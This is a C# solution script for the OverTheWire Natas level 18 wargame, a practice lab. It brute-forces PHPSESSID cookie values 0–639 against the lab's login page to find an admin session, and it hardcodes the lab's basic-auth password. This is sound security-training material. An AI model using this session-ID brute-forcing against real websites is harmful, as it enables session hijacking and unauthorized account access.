using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;

namespace Natas18
{
    class Program
    {
        static void Main(string[] args)
        {

            string html;
            string sumvols = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            string passwd = "";
            for (int i = 0; i < 640; i++)
            {
                HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create($"http://natas18.natas.labs.overthewire.org/index.php?debug=1&username=admin&password=q");
                request.Credentials = new NetworkCredential("natas18", "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP");
                // if (request.CookieContainer == null)
                // {
                //   request.CookieContainer = new CookieContainer();
                // }
                // request.CookieContainer.Add(new Cookie("PHPSESSID", Convert.ToString(i)));
                request.Headers["Cookie"] = $"PHPSESSID={i}";
                using (HttpWebResponse req = (HttpWebResponse)request.GetResponse())
                {
                 
                   using(Stream str = req.GetResponseStream())
                    {
                        using (StreamReader reader = new StreamReader(str))
                        {
                            html = reader.ReadToEnd();
                            if (html.Contains("You are an admin. The credentials for the next level are"))
                            {
                                Console.WriteLine(html);
                                break;
                            }
                            else
                            {
                                Console.WriteLine($"Session {i} failed");
                            }
                        }
                    }
                }

            }
            Console.ReadLine();
        }
    }
}
